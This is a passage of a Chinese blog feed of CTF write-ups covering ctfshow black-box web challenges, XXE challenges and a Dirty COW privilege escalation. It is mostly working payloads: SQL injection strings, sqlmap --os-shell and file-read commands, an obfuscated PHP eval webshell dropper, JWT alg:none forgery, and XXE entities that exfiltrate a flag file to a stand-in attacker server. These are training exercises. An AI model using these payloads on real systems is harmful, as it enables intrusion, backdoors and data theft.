href="#dirty-cow漏洞利用">¶</a>dirty_cow漏洞利用</h3><p>在kali搜索dirty cow即可拿到脚本40839.c, 编译后上传运行; 注意要同样的32位环境才能进行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit dirty cow</span><br><span class="line"><span class="comment"># Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW&#x27; &#x27;PTRACE_POKEDATA&#x27; Race Conditi | linux/local/40839.c</span></span><br></pre></td></tr></table></figure><p>此脚本会将root用户典当为firefart用户!以firefart用户身份使用ssh登录：<code>ssh firefart@192.168.110.132</code>打开/etc/passwd文件 将firefart更改为root 再以root登录<code>ssh root@192.168.110.132</code></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 提权 </tag>
            
            <tag> SSH毒化 </tag>
            
            <tag> NFS挂载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_黑盒测试</title>
      <link href="/article/ctfshow-webbasic-blackbox/"/>
      <url>/article/ctfshow-webbasic-blackbox/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Web入门_黑盒测试</h1><hr><h2 id="web380"><a class="header-anchor" href="#web380">¶</a>web380</h2><p>打开是一个网站, 看得出来是一个博客, 基本没有任何交互; 目录扫描发现了<code>flag.php</code>和<code>page.php</code>, 前者不显示同时也没有传参点, 后者有提示:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Notice: Undefined index: id in /var/www/html/page.php on line 16</span><br><span class="line">打开$id.php失败</span><br></pre></td></tr></table></figure><p>说明变量名为id, 尝试传参<code>?id=1</code>, 回显大概意思为没有<code>1.php</code>这个文件, 且读取文件用的是<code>file_get_contents()</code>函数</p><p>所以直接读取<code>flag.php</code>即可, payload如下; 现在可以在源码中得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=flag</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241027193855.png" alt="image.png"></p><h2 id="web381"><a class="header-anchor" href="#web381">¶</a>web381</h2><p>和上面的界面相同, 但是目录扫描没有出现有用的信息, <code>page.php</code>试过了, 锁死了<code>page_1.php</code>这种格式, 那只能换地方了</p><p>看看界面中有什么泄露的路径, 找到了一个<code>alsckdfy/layui/css/tree.css</code>, 访问<code>/alsckdfy/</code>成功得到flag</p><p>回显是&quot;这就是后台地址&quot;, 然后就是flag</p><h2 id="web382"><a class="header-anchor" href="#web382">¶</a>web382</h2><p>结合web381, 直接来到其后台地址, 发现存在登录框; 再次进行目录扫描, 有一个<code>check.php</code>, 可能存在登录框漏洞, 那就来抓包试试, 然后试出来sql注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">u=admin&amp;p=1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">u=admin&#x27;or &#x27;1&#x27;=&#x27;1&amp;p=1</span><br><span class="line">u=admin&#x27;and 1=1%23&amp;p=1</span><br></pre></td></tr></table></figure><p>登录即送flag</p><h2 id="web383"><a class="header-anchor" href="#web383">¶</a>web383</h2><p>和上一题一模一样, 也是sql注入得到flag, payload都不带变的</p><h2 id="web384"><a class="header-anchor" href="#web384">¶</a>web384</h2><ul><li>描述: 密码前2位是小写字母，后三位是数字</li></ul><p>那就是爆破了, 用bp在password处添加两个爆破位置, 选择<code>Cluster bomb</code>; 在payload界面分别设置<code>payload type</code>为<code>Brute forcer</code>, 然后分别设置两位小写英文字母和三位数字即可:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241027205709.png" alt="image.png"></p><p>或者用py脚本生成一个字典直接爆</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s1=string.ascii_lowercase</span><br><span class="line">s2=string.digits</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1:</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> s1:</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> s2:</span><br><span class="line">      <span class="keyword">for</span> l <span class="keyword">in</span> s2:</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> s2:</span><br><span class="line">          p=i+j+k+l+m</span><br><span class="line">          f.write(p+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>最后爆破出来是<code>xy123</code></p><h2 id="web385"><a class="header-anchor" href="#web385">¶</a>web385</h2><p>扫描目录扫到<code>/install</code>, 发现是安装界面, 可以通过访问<code>install/?install</code>重置密码:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241027211055.png" alt="image.png"></p><p>不知道默认密码, 但是肯定不是强密码, 直接爆破得到账密: <code>admin/admin888</code></p><h2 id="web386"><a class="header-anchor" href="#web386">¶</a>web386</h2><p>几乎和上一题相同, 多了一个<code>clear.php</code>文件, 而且现在有文件锁机制, 我们需要删除这个<code>lock.dat</code>才能重新安装</p><p>这个<code>clear.php</code>文件似乎用于删除文件, 这不正好么; 但是我们没有参数, 盲猜一手:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/clear.php?file=install/lock.dat</span><br></pre></td></tr></table></figure><p>重新访问<code>/install</code>, 发现成功删除, 返回<code>alsckdfy</code>利用上一题密码登录即可</p><h2 id="web387"><a class="header-anchor" href="#web387">¶</a>web387</h2><ul><li>描述: 前面部分和386一样</li></ul><p>真的尝试了一次, 发现会返回&quot;请勿删除安装文件&quot;, 让我们重新开始</p><p>扫目录, 扫出来<code>/debug</code>和<code>/robots.txt</code></p><p>访问<code>/debug</code>, 显示file not exist, 尝试传入<code>/debug/?file=</code>, 发现返回了php debug的信息? 不过非常可惜, 我没有成功利用, 但是却发现可以文件包含:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241027215135.png" alt="image.png"></p><p>那就文件包含吧, 包含一个日志<code>/var/log/nginx/access.log</code>, 然后在UA头里面写马, 然后就失败了(似乎是不能传参); 那就直接执行命令吧</p><p>可以删除文件锁, 或者是直接读取flag; 文件锁就不再次赘述了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除文件</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 执行命令, flag在/alsckdfy/check.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /var/www/html &gt; /var/www/html/1.txt&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /var/www/html/alsckdfy/check.php &gt; /var/www/html/2.txt&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241028084703.png" alt="image.png"></p><h2 id="web388"><a class="header-anchor" href="#web388">¶</a>web388</h2><p>此时再次尝试<code>/debug/file=</code>会显示调试结果已写入日志, 我认为这就是另一种文件包含, 看看有没有上传点</p><p>目录扫描后台地址, 发现有一个编辑器<code>/alsckdfy/editor</code>, 那就是编辑器漏洞了</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241028085838.png" alt="image.png"></p><p>选择插入文件(文件空间是空的), 似乎只能上传特定后缀文件; 但是由于文件包含, 这个程序被包含时会被执行, 我们可以利用这个生成一个独立的木马:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>打包zip上传, 上传后可以得到上传路径, 此时返回debug界面包含该文件, 再次回到根目录访问1.php即可拿到shell</p><blockquote><p>或者也可以和上一题一样, 直接日志包含, 将上面的生成木马的代码直接写到日志里面</p></blockquote><h2 id="web389"><a class="header-anchor" href="#web389">¶</a>web389</h2><p>访问debug显示权限不足, f12发现cookie多了auth字段判断权限, 那就是jwt伪造</p><p>修改用户为admin, 尝试密钥123456, 如图所示</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241028090911.png" alt="image.png"></p><p>剩下的步骤和上一题相同, 我就用直接日志包含的方法; 下图是1.php已经生成的结果, 需要多访问一次才能正常触发</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241028091220.png" alt="image.png"></p><p>然后就是执行命令了, 还是在<code>/alsckdfy/check.php</code>中</p><h2 id="web390"><a class="header-anchor" href="#web390">¶</a>web390</h2><p>访问文章变成了<code>/page.php?id=1</code>, 很可能存在注入, 测试发现单引号没反应, 是数字型注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 判断列数, 为3 */</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="comment">/* 判断显示位, 为2,3 */</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="comment">/* 查信息, 然后这里就断了, 查不了表 */</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),version()<span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="comment">/* 直接读文件, 查看源码即可 */</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> admin_user),(substr((<span class="keyword">select</span> load_file(<span class="string">&#x27;/var/www/html/alsckdfy/check.php&#x27;</span>)),<span class="number">1</span>,<span class="number">255</span>)) limit <span class="number">1</span>,<span class="number">1</span>#</span><br></pre></td></tr></table></figure><p>或者懒得搞, 直接交给sqlmap也行, 该文件会保存在本地</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python .\sqlmap.py -u http://fdbabc63-b2f3-4050-8b2e-9f5ee609119a.chall.ctf.show/page.php?<span class="built_in">id</span>=2 --file-read /var/www/html/alsckdfy/check.php --batch</span><br></pre></td></tr></table></figure><p>还可以改jwt加密方法绕过验证</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2  </span></span><br><span class="line"><span class="keyword">import</span> jwt  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># payload, 更改iat, exp, nbf, jti</span></span><br><span class="line">token_dict = &#123;  </span><br><span class="line"><span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,  </span><br><span class="line"><span class="string">&quot;iat&quot;</span>: <span class="number">1633525507</span>,  </span><br><span class="line"><span class="string">&quot;exp&quot;</span>: <span class="number">1633532707</span>,  </span><br><span class="line"><span class="string">&quot;nbf&quot;</span>: <span class="number">1633525507</span>,  </span><br><span class="line"><span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,  </span><br><span class="line"><span class="string">&quot;jti&quot;</span>: <span class="string">&quot;5d6279b30cda4893390547dd90151a0a&quot;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># headers  </span></span><br><span class="line">headers = &#123;  </span><br><span class="line"><span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>,  </span><br><span class="line"><span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">jwt_token = jwt.encode(token_dict, key=<span class="string">&#x27;&#x27;</span>,headers=headers, algorithm=<span class="string">&quot;none&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br></pre></td></tr></table></figure><h2 id="web391"><a class="header-anchor" href="#web391">¶</a>web391</h2><p>原来的注入点没了, 但是进入文章后顶部多了个输入框, 而且变成了字符型注入, 注入点为<code>/search.php?title=1</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 省略什么显示位啊和列啊什么的 </span><br><span class="line">?title=-1&#x27; union select 1,substr((select load_file(&#x27;/var/www/html/alsckdfy/check.php&#x27;)),1,255),3 limit 0,1%23</span><br></pre></td></tr></table></figure><p>用sqlmap:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python .\sqlmap.py -u http://042a780b-dfd3-4bd9-861c-81661b2915e0.chall.ctf.show/search.php?title=1 --file-read /var/www/html/alsckdfy/check.php --batch</span><br></pre></td></tr></table></figure><h2 id="web392"><a class="header-anchor" href="#web392">¶</a>web392</h2><p>更换了flag的位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?title=-1%27%20union%20select%201,substr((select%20load_file(%27/flag%27)),1,255),3%20limit%200,1%23  </span><br></pre></td></tr></table></figure><p>用sqlmap</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://175efaca-626f-46a6-bddd-68246b90c5f5.chall.ctf.show/search.php?title=1 --os-shell</span><br></pre></td></tr></table></figure><h2 id="web393"><a class="header-anchor" href="#web393">¶</a>web393</h2><p>主页最下方有一个搜索引擎功能, 选择百度, 发现并不是直接跳转百度, 而是利用本网站返回结果, 可能存在ssrf; 传入也不是网址, 可能是通过将数据存储到数据库, 然后由数据库交互且只返回id</p><blockquote><p><code>/link.php?id=3</code>会返回一个CSDN博客?是谁的呢</p></blockquote><p>但是那个地方本身并不能拿到东西, 所以我们重新看向了上一题的方法: 通过上面那个输入框爆破, 看看数据被放在哪里</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 爆库 ctfshow</span></span><br><span class="line">python .\sqlmap.py -u http://d62ac9f9-fdd1-4846-8a76-3ae86b75704a.challenge.ctf.show/search.php?title=1 --dbs --batch</span><br><span class="line"><span class="comment"># 爆表 link</span></span><br><span class="line">python .\sqlmap.py -u http://d62ac9f9-fdd1-4846-8a76-3ae86b75704a.challenge.ctf.show/search.php?title=1 -D ctfshow --tables</span><br><span class="line"><span class="comment"># 爆字段</span></span><br><span class="line">python .\sqlmap.py -u http://d62ac9f9-fdd1-4846-8a76-3ae86b75704a.challenge.ctf.show/search.php?title=1 -D ctfshow -T <span class="built_in">link</span> --columns</span><br><span class="line"><span class="comment"># 不放心可以再看看字段内容, 肯定是有https://baidu.com的</span></span><br><span class="line">python .\sqlmap.py -u http://d62ac9f9-fdd1-4846-8a76-3ae86b75704a.challenge.ctf.show/search.php?title=1 -D ctfshow -T <span class="built_in">link</span> -C url --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241028222426.png" alt="image"></p><p>所以我们可以将flag的结果(或网址)插入到这里面, 让我们可以通过<code>/link</code>路由访问到flag, payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search.php?title=1&#x27;;insert into link values(10,&#x27;a&#x27;,&#x27;file:///flag&#x27;);</span><br></pre></td></tr></table></figure><p>然后访问<code>/link.php?id=10</code>得到flag</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241028224012.png" alt="image.png"></p><h2 id="web394-web395"><a class="header-anchor" href="#web394-web395">¶</a>web394-web395</h2><ul><li>描述: FLAG_NOT_HERE</li></ul><p>和上题相同, 此处用的16进制绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search.php?title=1&#x27;;insert into link values(10,&#x27;a&#x27;,0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870);</span><br></pre></td></tr></table></figure><p>还有非预期解, 可以攻击redis服务和fastcig, 这个利用可以通过ssrf web360所使用的工具生成payload</p><p>但是url字段默认长度最长为255, 我们需要利用sql注入修改该设置., 其实就是改那个表, 将char(255)的限制改掉</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search.php?title=1&#x27;;alter table link modify column url text;</span><br></pre></td></tr></table></figure><p>利用Gopherus生成payload, 该payload输入后, 访问<code>link.php?id=11</code>就会生成对应木马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search.php?title=1&#x27;;insert into link values(11,&#x27;a&#x27;,payload);</span><br></pre></td></tr></table></figure><p>或者直接利用伪协议读取<code>check.php</code>, 访问<code>link.php?id=11</code>查看源代码即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search.php?title=1&#x27;;insert into link values(11,&#x27;a&#x27;,0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870);</span><br></pre></td></tr></table></figure><p>相关文件</p><ul><li>[[Web入门_SSRF]]</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> 文件删除 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_XXE</title>
      <link href="/article/ctfshow-webbasic-xxe/"/>
      <url>/article/ctfshow-webbasic-xxe/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Web入门_XXE</h1><hr><h2 id="web373"><a class="header-anchor" href="#web373">¶</a>web373</h2><ul><li>描述: 开x</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>简单来说就是接收xml数据从XML中提取 <code>ctfshow</code> 元素并输出它, payload如下</p><p>还有不要用Hackbar, 要用bp类工具才行</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web374-web376"><a class="header-anchor" href="#web374-web376">¶</a>web374-web376</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p>输出没啦, 那就只能外带到自己的服务器上</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">aaa</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://[vps-ip]/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%aaa;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>123<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中<code>test.dtd</code>放在服务器上, 利用python在80端口开一个简单的http服务就行了, 发包给靶机, 应该就能在自己的服务器上拿到编码后的flag</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://xxx/%file;&#x27;&gt; &quot;</span>&gt;</span></span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure><h2 id="web377"><a class="header-anchor" href="#web377">¶</a>web377</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa  </span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);  </span><br><span class="line"><span class="variable">$xmlfile </span>= <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;    <span class="variable">$dom </span>= <span class="keyword">new</span><span class="title function_ invoke__"> DOMDocument</span>();    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>利用utf16编码绕过即可, 还是外带到vps中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ddca1082-2f62-4f7f-b8b1-e369e33aa168.chall.ctf.show/&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % aaa SYSTEM &quot;http://xxx/test.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%aaa;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;123&lt;/root&gt;&quot;&quot;&quot;</span></span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">requests.post(url ,data=payload)</span><br></pre></td></tr></table></figure><h2 id="web378"><a class="header-anchor" href="#web378">¶</a>web378</h2><ul><li>描述: python X</li></ul><p>这是一个登录界面, 登录抓包可以发现传输数据用的是xml, 可以利用</p><p>似乎没有过滤? 那我就不客气了</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241027184330.png" alt="image.png"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><ul><li><p>utf-7绕过</p><p>除了utf-16绕过, 还有utf-7, 编码方式转换网站: <a href="https://www.motobit.com/util/charset-codepage-conversion.asp">Online charset</a></p></li><li><p>空格绕过</p><p>XML格式在设置标签属性的格式时允许使用任何数量的空格，因此我们可以在<code>&lt;?xml?&gt;</code>或<code>&lt;!DOCTYPE&gt;</code>中插入数量足够多的空格去绕过WAF的检测</p></li><li><p>探测内网</p><p>一般是读取<code>/etc/hosts</code>和<code>/proc/net/arp</code>文件获得内网ip</p></li><li><p>XXE修复</p><p>禁止使用外部实体或者过滤用户提交的XML数据</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_SSTI</title>
      <link href="/article/ctfshow-webbasic-ssti/"/>
      <url>/article/ctfshow-webbasic-ssti/</url>
      
